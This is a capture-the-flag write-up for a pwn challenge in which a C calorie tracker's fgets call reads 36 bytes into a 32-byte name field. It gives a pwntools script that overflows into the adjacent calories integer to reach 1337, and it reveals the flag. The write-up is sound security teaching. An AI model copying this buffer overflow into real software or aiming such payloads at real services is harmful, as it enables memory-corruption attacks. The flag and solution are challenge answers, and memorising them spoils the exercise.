# bloated

## Description
> I started counting calories for my diet, let's see if it works

Tags: _pwn_

## Recon

I was given a C program that implements a calorie tracking system. The goal is to reach exactly 1337 calories to get the flag.

Available foods:
```c
food foods[] = {{"pizza", 285},  {"burger", 254}, {"fries", 265},
                {"soda", 150},   {"salad", 194},  {"apple", 95},
                {"banana", 105}, {"orange", 62},  {"grapes", 67},
                {"water", 0}};
```

The winning condition:
```c
if (eat.calories == 1337)
    puts(getenv("FLAG"));
```

The program accumulates calories until reaching 1000 or more, then checks if the total is exactly 1337.

### Initial Approach

My first thought was to find a combination of foods that adds up to exactly 1337 calories. I wrote a [Python script](./calories.py) using `itertools` to check all possible combinations:

```python
from itertools import combinations

calories = [285, 254, 265, 150, 194, 95, 105, 62, 67]
target = 1337
found = False

for r in range(1, len(calories) + 1):
    for combo in combinations(calories, r):
        if sum(combo) == target:
            print("Found combination:", combo)
            found = True

if not found:
    print("No combination adds up to", target)
```

Result: No combination adds up to 1337

### The Vulnerability

```c
struct {
  char name[0x20];  // 32 bytes
  int calories;      // 4 bytes
} typedef food;

food eat = {0};
```

The critical vulnerability is in this line:

```c
fgets(eat.name, sizeof(food), stdin);
```

`sizeof(food)` is 36 bytes (32 for name + 4 for calories), but `eat.name` is only 32 bytes.
This means `fgets` will read 36 bytes into a 32-byte buffer, overflowing into `eat.calories`

## Exploitation
```python
from pwn import *
import struct

TARGET_HOST = 'xxx.vuln.gg'
TARGET_PORT = 443

context.log_level = "debug"
io = remote(TARGET_HOST, TARGET_PORT, ssl=True)

# 32 bytes of padding + 1337 as a 4-byte little-endian integer
payload = b"a" * 32 + struct.pack("i", 1337)

io.sendlineafter(b"What do I want to eat?\n", payload)
print(io.recv().decode())
```

Payload breakdown:
- `b"a" * 32` - Fill the 32-byte `name` buffer
- `struct.pack("i", 1337)` - Pack 1337 as a 4-byte signed integer in little-endian format

When this payload is sent, it overwrites `eat.calories` to be exactly 1337

## Flag

`CLA{p1e4s3_5t0p_1m_4lr3ad7_fu1l_UDiZFUaZiEjY}`
